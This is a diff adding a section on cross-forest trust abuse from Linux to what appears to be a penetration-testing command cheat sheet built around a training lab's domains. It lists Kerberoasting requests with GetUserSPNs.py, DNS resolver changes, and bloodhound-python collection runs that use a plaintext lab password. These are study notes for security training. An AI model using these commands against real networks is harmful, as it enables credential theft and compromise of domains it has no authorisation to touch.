@@ -1620,6 +1620,32 @@ Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
 
 # PowerShell cmd-let used to remotely connect to a target Windows FREIGHTLOGISTICS.LOCAL system from a Windows-based host.
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+#################################################################################################################
+#### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+cat /etc/resolv.conf
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+
+# Running bloodhound-python Against INLANEFREIGHT.LOCAL
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+zip -r ilfreight_bh.zip *.json
+
+# Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+#nameserver 1.1.1.1
+#nameserver 8.8.8.8
+domain FREIGHTLOGISTICS.LOCAL
+nameserver 172.16.5.238
+
+# Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
 ```
 
 ## Login Brute Forcing
